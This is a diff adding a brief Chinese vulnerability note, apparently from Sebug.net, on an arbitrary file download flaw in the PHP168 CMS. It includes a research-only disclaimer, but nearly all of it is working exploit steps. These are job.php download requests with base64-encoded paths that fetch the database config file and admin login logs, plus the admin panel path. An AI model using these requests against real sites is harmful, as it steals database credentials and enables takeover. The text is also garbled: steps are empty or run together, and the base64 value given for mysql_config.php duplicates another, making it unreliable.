@@ -1,0 +1,6 @@
+PHP168 下载任意文件漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.下载 mysql_config.php 和 adminlogin_logs.php 两个文件到本地。2. 3.http://dabei.org//job.php?job=download&url="aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="4. 5.http://dabei.org//job.php?job=download&url="aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="6. 7.程序后台：http://dabei.org/admin/index.php?iframe=18. 9.Base64加密代码：10. 11.http://dabei.org//cache/adminlogin_logs.php  ==  "aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA==" (引号里面的是Base64加密后的)12. 13.http://dabei.org//php168/mysql_config.php  ==  "aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="  (引号里面的是Base64加密后的)
